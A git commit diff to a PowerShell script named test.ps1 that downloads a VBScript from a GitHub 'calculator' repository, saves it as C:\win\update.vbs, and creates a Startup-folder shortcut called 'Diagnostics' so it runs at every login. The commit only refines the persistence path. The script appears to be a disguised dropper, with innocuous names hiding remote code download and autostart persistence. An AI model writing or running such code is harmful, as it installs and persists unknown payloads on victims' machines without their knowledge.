aedd4ee7ca55616b8f7b1cf1eba183cda2044348
rustgod455 <103788035+rustgod455@users.noreply.github.com>
2022-05-12 23:59:22 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,10 +1,10 @@
-strAllUsersProfile = [io.path]::GetFullPath($env:AllUsersProfile)
+
 $objShell = New-Object -com "Wscript.Shell"
 
 cd /
 mkdir win
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/rustgod455/calculator/main/open.vbs -OutFile c:/win/update.vbs
 
-$objShortcut = $objShell.CreateShortcut($strAllUsersProfile + "\Start Menu\Programs\Startup\Diagnostics.vbs")
+$objShortcut = $objShell.CreateShortcut("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Diagnostics.lnk")
 $objShortcut.TargetPath = "c:/win/update.vbs"
 $objShortcut.Save()
